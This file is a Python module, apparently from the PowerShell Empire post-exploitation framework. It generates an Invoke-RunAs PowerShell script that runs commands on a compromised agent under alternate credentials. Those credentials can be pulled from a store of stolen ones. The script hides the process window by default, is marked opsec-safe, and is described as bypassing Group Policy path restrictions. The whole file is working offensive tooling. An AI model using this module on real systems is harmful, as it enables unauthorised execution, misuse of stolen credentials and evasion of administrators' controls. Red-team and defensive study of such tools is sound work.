from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-RunAs',

            'Author': ['rvrsh3ll (@424f424f)'],

            'Description': ('Runas knockoff. Will bypass GPO path restrictions.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,
            
            'MinPSVersion' : '2',
            
            'Comments': [
                'https://github.com/rvrsh3ll/Misc-Powershell-Scripts/blob/master/RunAs.ps1'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'CredID' : {
                'Description'   :   'CredID from the store to use.',
                'Required'      :   False,
                'Value'         :   ''                
            },
            'Domain' : {
                'Description'   :   'Optional domain.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'UserName' : {
                'Description'   :   'Username to run the command as.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Password' : {
                'Description'   :   'Password for the specified username.',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Cmd' : {
                'Description'   :   'Command to run.',
                'Required'      :   True,
                'Value'         :   'notepad.exe'
            },
            'ShowWindow' : {
                'Description'   :   'Show the window for the created process instead of hiding it.',
                'Required'      :   False,
                'Value'         :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu
        
        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):
        
        script = """

function Invoke-RunAs {
<#
.DESCRIPTION
Runas knockoff. Will bypass GPO path restrictions.

.PARAMETER UserName
Provide a user

.PARAMETER Password
Provide a password

.PARAMETER Domain
Provide optional domain

.PARAMETER Cmd
Command to execute.

.PARAMETER ShowWindow
Show the window being created instead if hiding it (the default).

.Example
Invoke-RunAs -username administrator -password "P@$$word!" -domain CORPA -Cmd notepad.exe
#>
    [CmdletBinding()]Param (
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$username,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$password,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$domain,
    [Parameter(
        ValueFromPipeline=$True)]
        [String]$cmd,
    [Parameter()]
        [Switch]$ShowWindow
    )
    PROCESS {
        try{
            $startinfo = new-object System.Diagnostics.ProcessStartInfo

            $startinfo.FileName = $cmd
            $startinfo.UseShellExecute = $false

            if(-not ($ShowWindow)) {
                $startinfo.CreateNoWindow = $True
                $startinfo.WindowStyle = "Hidden"
            }

            if($UserName) {
                # if we're using alternate credentials
                $startinfo.UserName = $username
                $sec_password = convertto-securestring $password -asplaintext -force
                $startinfo.Password = $sec_password
                $startinfo.Domain = $domain
            }
            
            [System.Diagnostics.Process]::Start($startinfo) | out-string
        }
        catch {
            "[!] Error in runas: $_"
        }

    }
} Invoke-RunAs"""


        # if a credential ID is specified, try to parse
        credID = self.options["CredID"]['Value']
        if credID != "":
            
            if not self.mainMenu.credentials.is_credential_valid(credID):
                print helpers.color("[!] CredID is invalid!")
                return ""

            (credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]

            if domainName != "":
                self.options["Domain"]['Value'] = domainName
            if userName != "":
                self.options["UserName"]['Value'] = userName
            if password != "":
                self.options["Password"]['Value'] = password
        

        for option,values in self.options.iteritems():
            if option.lower() != "agent" and option.lower() != "credid":
                if values['Value'] and values['Value'] != '':
                    script += " -" + str(option) + " \"" + str(values['Value']) + "\"" 

        return script
